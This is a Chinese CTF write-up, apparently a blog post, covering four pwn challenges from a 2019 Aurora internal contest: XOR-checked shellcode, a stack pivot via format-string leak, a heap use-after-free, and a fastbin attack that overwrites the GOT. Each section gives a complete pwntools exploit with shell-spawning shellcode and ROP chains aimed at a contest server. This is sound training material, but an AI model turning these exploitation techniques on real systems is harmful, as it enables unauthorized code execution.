---
title: Aurora内部赛pwn writeup
date: 2019-06-10 15:33:49
tags:
---



所有题目和源文件：[链接](<https://github.com/CP32/ctf-pwn/tree/master/2019Aurora%E5%86%85%E9%83%A8%E8%B5%9B>)

## face wall project

##### checksec分析

```
[*] '/home/ljb/ctf/aurora/face_wall_project/break_the_wall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

除了PIE开启，其他全关

<!--more-->

IDA打开，F5，发现如下报错。找到那一行，发现是调用了buf的指令，理解之后把那一行nop掉，再F5，就能正常分析了。

![](https://github.com/CP32/ctf-pwn/blob/master/2019Aurora%E5%86%85%E9%83%A8%E8%B5%9B/face%20wall%201.jpg?raw=true)

分析发现是读入30字节的数据。

1. 用strlen判断数据长度要大于29，即长度要等于30，所以不能有0截断。
2. 检查数据中是否有\x90，所以不能有nop指令。
3. 一个xor函数，把奇数位数据进行异或得到a，然后把偶数位数据进行异或得到b，比较a和b是否相同，如果相同则执行数据。

##### 解题思路：

显然是要我们传入shellcode从而执行shellcode。要求长度为30，且不能用nop指令填充，因此最好的办法是把一些无关指令重复执行。又因为xor函数的校验，我们需要让shellcode长度为29，最后进行计算填充第30位，从而绕过xor的检查。

##### exp:

```python
from pwn import *
elf=ELF("break_the_wall")
io=elf.process()
#io=remote("123.207.32.26",9004)
libc=elf.libc
#libc=ELF("")
#context.log_level='debug'
context.bits=64

sla=io.sendlineafter
sl=io.sendline
sa=io.sendafter
ru=io.recvuntil
shell=io.interactive

shellcode=asm('xor rsi,rsi')
shellcode+=asm('xor rdx,rdx')#execve第二个参数rsi，第三个参数rdx置0
shellcode+=asm('xor rax,rax')#系统调用rax位清0.
shellcode+=asm('push rax')
shellcode+=asm('push rax')
shellcode+=asm('push rax')#填充使得shellcode为29位。同时因为rax=0，可以达到对'//bin/sh'0截断的效果
shellcode+=asm('mov rbx,0x68732f2f6e69622f')#'//bin/sh'
shellcode+=asm('push rbx')
shellcode+=asm('push rsp')#rsp是'//bin/sh'的地址
shellcode+=asm('pop rdi')
shellcode+=asm('mov al,0x3b')
shellcode+=asm('syscall')#execve('//bin/sh',0,0)
print len(shellcode)

#另一种写法
'''
shellcode=asm('xor rsi,rsi')
shellcode+=asm('xor rdx,rdx')
shellcode+=asm('xor rax,rax')
shellcode+=asm('push rax')
shellcode+=asm('push rax')
shellcode+=asm('mov rbx,0x68732f2f6e69622f')
shellcode+=asm('push rbx')
shellcode+=asm('mov rdi,rsp')#变动在这里，直接把rsp放到rdi
shellcode+=asm('mov al,0x3b')
shellcode+=asm('syscall')
print len(shellcode)
'''
#xor校验
temp=0
for i in range(15):
	temp^=ord(shellcode[2*i])

temp1=0
for i in range(14):
	temp^=ord(shellcode[2*i+1])

shellcode+=chr(temp^temp1)
print len(shellcode)
sa('ask?\n',shellcode)
shell()
```

flag:

![](https://github.com/CP32/ctf-pwn/blob/master/2019Aurora%E5%86%85%E9%83%A8%E8%B5%9B/face%20wall%20project/cat%20flag.jpg?raw=true)

PS：本题原型DEFCON QUALIFIER 2019 SPEED RUN 003，主要是对xor函数做了小改动。

PPS：本题彩蛋：《三体》-面壁计划



### baby stack

##### checksec分析

```
[*] '/home/ljb/ctf/aurora/exam/exam'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

只有canary被关闭，其他防护全开

##### IDA F5分析

主要功能：

1. readQuestion，没用，3个puts输出固定字符串。
2. writeAnswer，读入0x80个字节，存在0x10个字节栈溢出，同时会把读入数据复制一份到bss段中的answersheet。
3. askTeacher，存在格式化字符串漏洞
4. takeAnap，sleep两小时。。。
5. backdoor，不能直接调用，需要传一个参数。参数等于30，且全局变量point=666，即可得到flag。

##### 解题思路：

由于开了PIE，因此leak需要通过格式化字符串。又由于执行backdoor需要参数，因此至少需要0x20（ebp+pop_rdi+30+backdoor）个字节的栈溢出才能构造ROP链。由此想到可以通过栈迁移来达成。

栈迁移首先需要找`leave;ret;`。这次从题目文件中找，由于开了PIE，所以我们需要leak出PIE。经过测试，直接栈迁移到answersheet中，在执行过程中会把GOT表破坏掉从而报错。因此我们考虑把栈迁移到栈中，即writeAnswer中读入数据存的地方。所以我们还需要leak出栈地址。

之后构造ROP链，有两种方法。一种是先用格式化字符串改了point全局变量，接着调用backdoor函数。另一种是通过ret2libc，先leak出libc函数的地址再调用system('/bin/sh')

##### exp:

```python
from pwn import *
elf=ELF("exam")
#io=elf.process()
io=remote("123.207.32.26",9002)
libc=elf.libc
#libc=ELF("")
context.log_level='debug'

sla=io.sendlineafter
sl=io.sendline
sa=io.sendafter
ru=io.recvuntil
shell=io.interactive

def menu(choice):
	sla("room",str(choice))

def write(payload):
	menu(2)
	sa("paper:\n",payload)
	sla("[Y/N]\n",'Y')

def ask(payload):
	menu(3)
	sa("question?\n",payload)

csu_init=0x15f0
backdoor=0x11c5
bss=0x4040
leave_ret=0x12c5#ROPgadget --binary exam --only 'leave|ret'
pop_rdi=0x164b#ROPgadget --binary exam --only 'pop|ret'|grep rdi
point=0x4014

#gdb.attach(io)
payload='%24$paaa%13$pbbb%19$pccc%20$pddd'
ask(payload)
ru("is : ")
#leak PIE
csu_init_addr=int(ru("aaa",True),16)
pie=csu_init_addr-csu_init
print "pie:"+hex(pie)

#leak libc
puts_addr=int(ru("bbb",True),16)
puts_addr=puts_addr-362
libcbase=puts_addr-libc.sym['puts']
print "libcbase:"+hex(libcbase)
libc.address=libcbase

#leak canary
canary=int(ru('ccc',True),16)
print 'canary:'+hex(canary)

#leak stack
target=int(ru('ddd',True),16)
target-=0x90#这里需要gdb调试观察
print 'target:'+hex(target)

#1:stack pivot+ret2libc
'''
payload=p64(1)
payload+=p64(pie+pop_rdi)
payload+=p64(libc.search('/bin/sh').next())
payload+=p64(libc.sym['system'])
payload+='\x90'*(0x68-len(payload))
payload+=p64(canary)
payload+=p64(target)
payload+=p64(pie+leave_ret)
write(payload)
shell()
'''
'''
#2:fmtstr+stack pivot+backdoor
payload='%666c%8$hn'
payload+=(16-len(payload))*'a'
payload+=p64(pie+point)
ask(payload)
payload=p64(1)
payload+=p64(pie+pop_rdi)
payload+=p64(30)
payload+=p64(pie+backdoor)
payload+='\x90'*(0x68-len(payload))
payload+=p64(canary)
payload+=p64(target)
payload+=p64(pie+leave_ret)
write(payload)
print io.recv()
'''
```

PS：本题原来是开了canary防护的，后来重新编译的时候忘记了加，因此exp中还有leak canary这一步。

PPS：本题彩蛋：比赛第一天是6月8号，刚好是高考第二天，因此题目中的故事都是高考背景。缅怀大家逝去的高中青春。



### baby heap

##### checksec分析

```
[*] '/home/ljb/ctf/aurora/double/double'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

除了RELRO，其他全开。

##### IDA F5分析

主要功能：

1. add info，申请一个0x10大小的堆。前8字节存message地址，后8字节存puts函数地址。message是根据输入大小malloc的堆。
2. del info，删除info。这里是先删除info堆，再删除对应message堆，同时存在UAF漏洞。
3. show info，输入info index输出对应message存的信息。注意这里的输出调用的是info中的puts地址。这里index管理很好不存在溢出。

##### 解题思路：

由于存在UAF，因此可以考虑利用fastbin的特性。先leak出libc，然后把puts函数地址改为system函数地址，message写'/bin/sh'，从而执行system('/bin/sh') get shell。

##### exp：

```python
from pwn import *
elf=ELF("double")
#io=elf.process()
#io=elf.process(,env={'LD_PRELOAD':'.so'})
io=remote("123.207.32.26",9001)
libc=elf.libc
#libc=ELF("")
context.log_level='debug'

sla=io.sendlineafter
sl=io.sendline
sa=io.sendafter
ru=io.recvuntil
shell=io.interactive

def menu(choice):
	sla("choice:\n",str(choice))

def addinfo(length,message='jb'):
	menu(1)
	sla("length\n",str(length))
	sa("message\n",message)

def delinfo(index):
	menu(2)
	sla("delete\n",str(index))

def showinfo(index):
	menu(3)
	sla("watch\n",str(index))

addinfo(0x10)#申请和info同样大小的堆，从而使得message和info被free后进入同一个fastbin
delinfo(0)
addinfo(0x10,'a'*8)#因为上面后free的是message堆，因此info[1]申请的是info[0]->message，info[1]->message申请的是info[0]
showinfo(1)#由于info[1]->message申请的是info[0]，因此后8字节是puts函数地址，从而leak libc
ru('a'*8)
puts_addr=ru('\n',True)
puts_addr=u64(puts_addr+'\x00\x00')
libcbase=puts_addr-libc.sym['puts']
print hex(libcbase)
libc.address=libcbase

addinfo(0x10)
delinfo(2)
addinfo(0x10,p64(libc.search('/bin/sh').next())+p64(libc.sym['system']))#重新申请，参考上面的操作，把info->message改为'/bin/sh'地址，puts函数地址改为system函数地址
showinfo(2)#通过show功能触发system函数
shell()

```

PS：本题题目跟国赛一致，都是double，但利用方法都不是double free。本题flag为Aurora{n0t_double_free_bu7_double_types_2333}。意在说明double并不一定是指double free，有可能是指两种堆的类型double type，不要被惯性思维了，因此这题也算类型混淆的一种。



## child heap

##### checksec分析

```
[*] '/home/ljb/ctf/aurora/notebook/notebook'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

##### IDA F5分析（本题IDA分析文件也在链接中）

主要功能：

1. new，按照输入的大小申请堆，在全局数组record中，先存size，再存堆地址。注意题目中写的read函数需要输入回车来结束，否则长度不够就会直接exit(1)。
2. edit，先输入index，再输入大小，然后对record中index对应的堆内容进行编辑。这里对输入大小不检查，因此存在堆溢出。
3. delete，输入index，释放堆，同时把record中的size和堆地址置0。这里存在数组越界。
4. look，输入index，查看对应堆信息。这里同样存在数组越界。

##### 解题思路：

由于存在堆溢出，且对申请堆的size无限制，因此可以考虑fastbin attack中的Arbitrary Alloc，伪造堆到全局数组record中，从而控制record的内容。由于没有开启FULL RELRO，因此可以考虑改GOT表。把free改成system从而get shell。

##### exp:

```python
from pwn import *
elf=ELF("notebook")
#io=elf.process()
#io=elf.process(,env={'LD_PRELOAD':'.so'})
io=remote("123.207.32.26",9003)
libc=elf.libc
#libc=ELF("")
context.log_level='debug'

sla=io.sendlineafter
sl=io.sendline
sa=io.sendafter
ru=io.recvuntil
shell=io.interactive

def menu(choice):
	sla("your choice?\n",str(choice))

def new(size,content='jb\n'):
	menu(1)
	sla("notebook:\n",str(size))
	sa("content:\n",content)

def edit(index,size,content):
	menu(2)
	sla("notebook:\n",str(index))
	sla("lenth of notebook:\n",str(size))
	io.send(content)

def delete(index):
	menu(3)
	sla("index:\n",str(index))

def look(index):
	menu(4)
	sla("index:\n",str(index))

#gdb.attach(io)
new(0x61)#0
new(0x50)#1
delete(1)#此时fastbin中只有堆1
payload='a'*0x60#填充堆0
payload+=p64(0)+p64(0x61)#堆1的prev_size和size
payload+=p64(0x6020a0-8)+'\n'#伪造堆1的fd，指向record-8，此时record[0]->size存的是0x61，和堆1的size域相同，和堆1处于同一个fastbin
edit(0,0x80,payload)
new(0x50)#1，原来的堆1
new(0x50)#2，fake heap，堆地址是&record[-1]->mesg_addr，userdata地址（即malloc返回的地址）是&record[0]->mesg_addr
new(0x10,'/bin/sh\x00\n')#3
payload=p64(elf.got['free'])
edit(2,0x10,payload+'\n')#相当于改了record[0]->mesg_addr为free的got表地址

#leak libc
look(0)#由于record[0]->mesg_addr=free@got，因此查看会直接得到free的got表内容即free实际地址
ru("0:")
mesg=ru("\n",True)
free_addr=u64(mesg+'\x00\x00')
libcbase=free_addr-libc.sym['free']
print "libcbase:"+hex(libcbase)
libc.address=libcbase

payload=p64(libc.sym['system'])[0:7]
edit(0,0x10,payload+'\n')#改*(record[0]->mesg_addr)为system地址
delete(3)#调用system('/bin/sh')
shell()
```

